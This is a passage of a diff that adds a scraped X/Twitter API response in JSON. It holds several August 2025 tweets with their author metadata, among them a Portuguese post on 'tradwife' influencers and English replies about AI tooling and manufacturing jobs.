+          "description": "⠀ ⠀⠀⠀ 𝟭𝟭.𝟭𝟭───𝗄𝗂𝗌𝗌 𝖺𝗐𝘢𝗒 𝗒𝘰𝗎𝗋 𝘤𝗋𝗎𝖾𝗅𝗍𝘺⠀ ⠀ ` ⠀ ⠀燽 ⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+          "entities": {
+            "description": {},
+            "url": {
+              "urls": [
+                {
+                  "display_url": "white-nights.carrd.co",
+                  "expanded_url": "https://white-nights.carrd.co/",
+                  "indices": [
+                    0,
+                    23
+                  ],
+                  "url": "https://t.co/3238Aa5B4g"
+                }
+              ]
+            }
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {
+        "media": [
+          {
+            "display_url": "pic.twitter.com/yOYRB1FI6A",
+            "expanded_url": "https://twitter.com/necrosia_/status/1952102793776435579/photo/1",
+            "ext_alt_text": "San Kiss Ateez Kiss GIF",
+            "ext_media_availability": {
+              "status": "Available"
+            },
+            "id_str": "1952102785626890240",
+            "indices": [
+              45,
+              68
+            ],
+            "media_key": "16_1952102785626890240",
+            "media_results": {
+              "id": "QXBpTWVkaWFSZXN1bHRzOgwAAgoAARsXQyQOV2AACgACGxdDJfQXkXsAAA==",
+              "result": {
+                "__typename": "ApiMedia",
+                "id": "QXBpTWVkaWE6DAACCgABGxdDJA5XYAAKAAIbF0Ml9BeRewAA",
+                "media_key": "16_1952102785626890240"
+              }
+            },
+            "media_url_https": "https://pbs.twimg.com/tweet_video_thumb/GxdDJA5XYAAMvSu.jpg",
+            "original_info": {
+              "focus_rects": [],
+              "height": 320,
+              "width": 218
+            },
+            "sizes": {
+              "large": {
+                "h": 320,
+                "w": 218
+              }
+            },
+            "type": "animated_gif",
+            "url": "https://t.co/yOYRB1FI6A",
+            "video_info": {
+              "aspect_ratio": [
+                109,
+                160
+              ],
+              "variants": [
+                {
+                  "bitrate": 0,
+                  "content_type": "video/mp4",
+                  "url": "https://video-s.twimg.com/tweet_video/GxdDJA5XYAAMvSu.mp4"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "1939352774094770176",
+            "indices": [
+              0,
+              8
+            ],
+            "name": "⋅ ˢʳⁿ",
+            "screen_name": "ghodear"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102793176662306",
+      "url": "https://x.com/MariLu180205/status/1952102793176662306",
+      "twitterUrl": "https://twitter.com/MariLu180205/status/1952102793176662306",
+      "text": "a gabriella jacinto fazia conteúdo de \"esposa troféu\" e logo dps ela msm desmentiu esse personagem falando q ela n depende do marido financeiramente pq grava vídeos e vende coisas na Internet, aí dps vem as tontas acreditando nisso de tradwife",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:28 +0000 2025",
+      "lang": "pt",
+      "bookmarkCount": 0,
+      "isReply": false,
+      "inReplyToId": null,
+      "conversationId": "1952102793176662306",
+      "inReplyToUserId": null,
+      "inReplyToUsername": null,
+      "author": {
+        "type": "user",
+        "userName": "MariLu180205",
+        "url": "https://x.com/MariLu180205",
+        "twitterUrl": "https://twitter.com/MariLu180205",
+        "id": "1292434862478110721",
+        "name": "Gata de Schrödinger 🐱",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1719375115790475264/-OILPb44_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1292434862478110721/1725886183",
+        "description": "",
+        "location": "",
+        "followers": 105,
+        "following": 272,
+        "status": "",
+        "canDm": false,
+        "canMediaTag": false,
+        "createdAt": "Sun Aug 09 12:19:09 +0000 2020",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 231833,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 105,
+        "statusesCount": 9286,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [],
+        "profile_bio": {
+          "description": "(ela/dela)",
+          "entities": {
+            "description": {},
+            "url": {
+              "urls": [
+                {
+                  "display_url": "instagram.com/malu_carvalho7…",
+                  "expanded_url": "https://www.instagram.com/malu_carvalho7?igsh=MTJyaDNwYWs2eG94cg==",
+                  "indices": [
+                    0,
+                    23
+                  ],
+                  "url": "https://t.co/VS4PYx4lW7"
+                }
+              ]
+            }
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {},
+      "quoted_tweet": {
+        "type": "tweet",
+        "id": "1952080354413793542",
+        "url": "https://x.com/lowbimbo/status/1952080354413793542",
+        "twitterUrl": "https://twitter.com/lowbimbo/status/1952080354413793542",
+        "text": "propagandas que eu não caio: mulher fudida tentando convencer as outras a se foderem tb. se fosse tão bom ser dona de casa e dependente financeira de homem vc não tava na internet tentando monetizar &gt;&lt;",
+        "source": "Twitter for iPhone",
+        "retweetCount": 903,
+        "replyCount": 26,
+        "likeCount": 7213,
+        "quoteCount": 16,
+        "viewCount": 82084,
+        "createdAt": "Sun Aug 03 18:53:19 +0000 2025",
+        "lang": "pt",
+        "bookmarkCount": 141,
+        "isReply": false,
+        "inReplyToId": null,
+        "conversationId": "1952080354413793542",
+        "inReplyToUserId": null,
+        "inReplyToUsername": null,
+        "author": {
+          "type": "user",
+          "userName": "lowbimbo",
+          "url": "https://x.com/lowbimbo",
+          "twitterUrl": "https://twitter.com/lowbimbo",
+          "id": "1278077476292497412",
+          "name": "doll 🎀",
+          "isVerified": false,
+          "isBlueVerified": false,
+          "verifiedType": null,
+          "profilePicture": "https://pbs.twimg.com/profile_images/1645902881743073281/Y5E0YapO_normal.jpg",
+          "coverPicture": "https://pbs.twimg.com/profile_banners/1278077476292497412/1736129935",
+          "description": "",
+          "location": "🌎",
+          "followers": 3212,
+          "following": 178,
+          "status": "",
+          "canDm": true,
+          "canMediaTag": false,
+          "createdAt": "Tue Jun 30 21:26:41 +0000 2020",
+          "entities": {
+            "description": {
+              "urls": []
+            },
+            "url": {}
+          },
+          "fastFollowersCount": 0,
+          "favouritesCount": 42411,
+          "hasCustomTimelines": true,
+          "isTranslator": false,
+          "mediaCount": 366,
+          "statusesCount": 9407,
+          "withheldInCountries": [],
+          "affiliatesHighlightedLabel": {},
+          "possiblySensitive": false,
+          "pinnedTweetIds": [],
+          "profile_bio": {
+            "description": "🎀💕💗",
+            "entities": {
+              "description": {},
+              "url": {
+                "urls": [
+                  {
+                    "display_url": "instagram.com/vintagebimbo",
+                    "expanded_url": "http://instagram.com/vintagebimbo",
+                    "indices": [
+                      0,
+                      23
+                    ],
+                    "url": "https://t.co/FPmE15xDP7"
+                  }
+                ]
+              }
+            }
+          },
+          "isAutomated": false,
+          "automatedBy": null
+        },
+        "extendedEntities": {},
+        "card": null,
+        "place": {},
+        "entities": {},
+        "quoted_tweet": {
+          "type": "tweet",
+          "id": "1951768026841485723",
+          "url": "",
+          "twitterUrl": "",
+          "text": "",
+          "source": "Twitter for iPhone",
+          "retweetCount": 0,
+          "replyCount": 0,
+          "likeCount": 0,
+          "quoteCount": 0,
+          "viewCount": 0,
+          "createdAt": "",
+          "lang": "",
+          "bookmarkCount": 0,
+          "isReply": false,
+          "inReplyToId": null,
+          "conversationId": "",
+          "inReplyToUserId": null,
+          "inReplyToUsername": null,
+          "author": {},
+          "extendedEntities": {},
+          "card": null,
+          "place": {},
+          "entities": {},
+          "quoted_tweet": null,
+          "retweeted_tweet": null,
+          "article": null
+        },
+        "retweeted_tweet": null,
+        "article": null
+      },
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102793042608256",
+      "url": "https://x.com/tmaiaroto/status/1952102793042608256",
+      "twitterUrl": "https://twitter.com/tmaiaroto/status/1952102793042608256",
+      "text": "@pk_iv This gets much, much, more complicated and nuanced. You can get some fairly basic things with AI here, but this isn't as easy as one might think.",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:28 +0000 2025",
+      "lang": "en",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952038436665491925",
+      "conversationId": "1952038436665491925",
+      "inReplyToUserId": "207352077",
+      "inReplyToUsername": "pk_iv",
+      "author": {
+        "type": "user",
+        "userName": "tmaiaroto",
+        "url": "https://x.com/tmaiaroto",
+        "twitterUrl": "https://twitter.com/tmaiaroto",
+        "id": "56448819",
+        "name": "Tom Maiaroto",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/595733291912814592/4sGXYcJ6_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/56448819/1430869115",
+        "description": "",
+        "location": "Bay Area, CA",
+        "followers": 4584,
+        "following": 4244,
+        "status": "",
+        "canDm": false,
+        "canMediaTag": false,
+        "createdAt": "Mon Jul 13 18:21:10 +0000 2009",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 13093,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 333,
+        "statusesCount": 10087,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [],
+        "profile_bio": {
+          "description": "Imagine whatever you were expecting to see in my bio is written right here.",
+          "entities": {
+            "description": {}
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "207352077",
+            "indices": [
+              0,
+              6
+            ],
+            "name": "Paul Klein IV",
+            "screen_name": "pk_iv"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102791863824657",
+      "url": "https://x.com/Wingzbrat2002/status/1952102791863824657",
+      "twitterUrl": "https://twitter.com/Wingzbrat2002/status/1952102791863824657",
+      "text": "@mitchellvii We have 400k+ manufacturing jobs sitting unfulfilled right now. I think it’s great to build stuff here, what’s the detailed plans? Have we seen them? I’m guessing the majority will be robotic or AI powered by then.",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:28 +0000 2025",
+      "lang": "en",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952098639666446536",
+      "conversationId": "1952098639666446536",
+      "inReplyToUserId": "17980523",
+      "inReplyToUsername": "mitchellvii",
+      "author": {
+        "type": "user",
+        "userName": "Wingzbrat2002",
+        "url": "https://x.com/Wingzbrat2002",
+        "twitterUrl": "https://twitter.com/Wingzbrat2002",
+        "id": "1923873146068926465",
+        "name": "Kim C",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1945333033394987008/QEFdx6cy_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1923873146068926465/1752638635",
+        "description": "",
+        "location": "United States",
+        "followers": 26,
+        "following": 60,
+        "status": "",
+        "canDm": false,
+        "canMediaTag": true,
+        "createdAt": "Sat May 17 22:48:19 +0000 2025",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 739,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 22,
+        "statusesCount": 187,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [],
+        "profile_bio": {
+          "description": "I value honesty.",
+          "entities": {
+            "description": {}
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "17980523",
+            "indices": [
+              0,
+              12
+            ],
+            "name": "Bill Mitchell",
+            "screen_name": "mitchellvii"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    }
+  ],
+  "has_next_page": true,
+  "next_cursor": "DAADDAABCgABGxdDJ1oWwHQKAAIbF0MlghdxEQAIAAIAAAACCAADAAAAAAgABAAAAAAKAAUbF0MoDEAnEAoABhsXQygMP9jwAAA"
+}
